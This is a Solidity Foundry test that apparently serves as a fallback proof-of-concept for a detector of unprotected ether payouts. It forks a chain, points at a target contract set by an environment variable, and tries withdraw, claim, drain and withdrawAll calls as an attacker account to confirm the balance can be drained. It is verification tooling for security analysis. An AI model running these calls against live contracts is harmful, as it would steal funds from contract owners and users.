// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Open drain (unprotected ether send)
/// @notice Detector: unprotected-ether. A payout function has no access
///         check and no entitlement bound, so ANY caller can drain the
///         contract's balance.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. Tries the common payout selectors in turn;
///      each attempt must move funds to count as proof (a fallback fn that
///      silently succeeds proves nothing).

contract PoC is Test {
    address public target;
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    function test_exploit() public {
        address attackerEOA = makeAddr("attacker");
        vm.deal(attackerEOA, 1 ether);

        uint256 targetBefore = target.balance;
        require(targetBefore > 0, "target holds no ETH to drain");

        // TODO: narrow to the target's real payout function if known.
        bytes[] memory candidates = new bytes[](4);
        candidates[0] = abi.encodeWithSignature("withdraw()");
        candidates[1] = abi.encodeWithSignature("claim()");
        candidates[2] = abi.encodeWithSignature("drain()");
        candidates[3] = abi.encodeWithSignature("withdrawAll()");

        bool drained = false;
        for (uint256 i = 0; i < candidates.length; i++) {
            vm.prank(attackerEOA);
            (bool ok,) = target.call(candidates[i]);
            if (ok && target.balance < targetBefore) {
                drained = true;
                console.log("drained via candidate index:", i);
                break;
            }
        }
        console.log("target balance before:", targetBefore);
        console.log("target balance after:", target.balance);
        assertTrue(drained, "exploit did not reproduce: no payout selector drained funds");
    }
}
